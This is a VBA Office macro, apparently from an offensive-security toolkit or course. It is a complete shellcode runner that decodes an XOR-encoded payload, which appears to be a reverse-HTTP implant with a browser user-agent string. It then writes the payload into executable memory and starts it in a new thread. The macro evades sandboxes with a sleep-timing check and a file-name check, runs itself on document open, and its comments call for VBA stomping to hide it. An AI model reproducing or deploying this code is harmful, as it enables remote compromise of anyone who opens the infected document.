' Create 32-bit shellcode and encrypt it with encrypt.py
' Perform VBA stomping with EvilClippy

Private Declare PtrSafe Function Sleep Lib "kernel32.dll" (ByVal dwMilliseconds As Long) As Long
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32.dll" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "ntdll.dll" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32.dll" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByRef lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32.dll" (ByVal handle As LongPtr, ByVal milliseconds As Long) As Long

Function MyMacro()
  Dim time As Date
  Dim diff As Long

  Dim buf As Variant
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long

  time = Now()
  Sleep (3000)
  diff = DateDiff("s", time, Now())

  If diff < 2 Then
    Exit Function
  End If
  If ActiveDocument.Name <> "exploit.doc" Then
    Exit Function
  End If

  buf = Array(3,23,112,255,255,255,159,206,45,155,116,173,207,118,26,116,173,243,116,173,235,240,72,181,217,116,141,215,206,0,206,63,83,195,158,131,253,211,223,62,48,242,254,56,182,138,16,173,116,173,239,168,116,189,195,254,47,116,191,135,122,63,139,179,254,47,116,167,223,254,44,175,116,183,231,122,54,139,195,182, _
  206,0,116,203,116,254,41,206,63,62,48,242,83,254,56,199,31,138,11,252,130,7,196,130,219,138,31,167,116,167,219,254,44,153,116,243,180,116,167,227,254,44,116,251,116,254,47,118,187,219,219,164,164,158,166,165,174,0,31,167,160,165,116,237,22,127,0,0,0,162,151,145,154,139,255,151,136,150,145,150, _
  171,151,179,136,217,248,0,42,206,36,172,172,172,172,172,23,140,255,255,255,178,144,133,150,147,147,158,208,202,209,207,223,215,178,158,156,150,145,139,144,140,151,196,223,182,145,139,154,147,223,178,158,156,223,176,172,223,167,223,206,204,160,206,214,223,190,143,143,147,154,168,154,157,180,150,139,208,202,204,200, _
  209,204,201,223,215,180,183,171,178,179,211,223,147,150,148,154,223,184,154,156,148,144,214,223,188,151,141,144,146,154,208,206,207,199,209,207,209,207,209,207,223,172,158,153,158,141,150,208,202,204,200,209,204,201,255,151,197,169,134,88,0,42,172,172,149,252,172,172,151,68,254,255,255,23,235,254,255,255,208,166, _
  139,175,172,150,142,143,200,167,135,169,203,177,167,148,207,183,188,202,190,185,152,177,149,177,181,153,181,170,140,177,182,176,179,185,139,151,187,210,143,148,135,136,141,181,181,200,175,173,155,174,185,190,157,147,137,145,180,166,172,210,168,151,175,189,186,184,147,210,205,134,177,184,167,168,187,156,157,175,157,147, _
  178,198,176,144,135,200,185,145,149,144,176,150,189,143,182,187,170,202,145,171,152,184,183,168,183,151,152,187,167,139,210,149,184,151,133,184,190,190,167,170,151,141,139,145,169,143,179,157,147,186,255,175,151,168,118,96,57,0,42,118,57,172,151,255,205,23,123,172,172,172,168,172,169,151,20,170,209,196,0,42, _
  105,149,245,160,151,127,204,255,255,118,31,149,251,175,149,224,169,151,138,185,97,121,0,42,172,172,172,172,169,151,210,249,231,132,0,42,122,63,138,235,151,119,236,255,255,151,187,15,202,31,0,42,176,138,50,23,180,255,255,255,149,191,151,255,239,255,255,151,255,255,191,255,172,151,167,91,172,26,0,42, _
  108,172,172,118,24,168,151,255,223,255,255,172,169,151,237,105,118,29,0,42,122,63,139,48,116,248,254,60,122,63,138,26,167,60,160,23,148,0,0,0,206,198,205,209,206,201,199,209,203,198,209,206,206,205,255,68,31,226,213,245,151,89,106,66,98,0,42,195,249,131,245,127,4,31,138,250,68,184,236,141, _
  144,149,255,172,0,42)

  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
  For counter = LBound(buf) To UBound(buf)
    data = buf(counter) Xor &HFF
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter
  res = CreateThread(0, 0, addr, 0, 0, 0)
  ' res = WaitForSingleObject(res, &HFFFFFFFF)
End Function

Sub Document_Open()
  MyMacro
End Sub
Sub Workbook_Open()
  MyMacro
End Sub
Sub AutoOpen()
  MyMacro
End Sub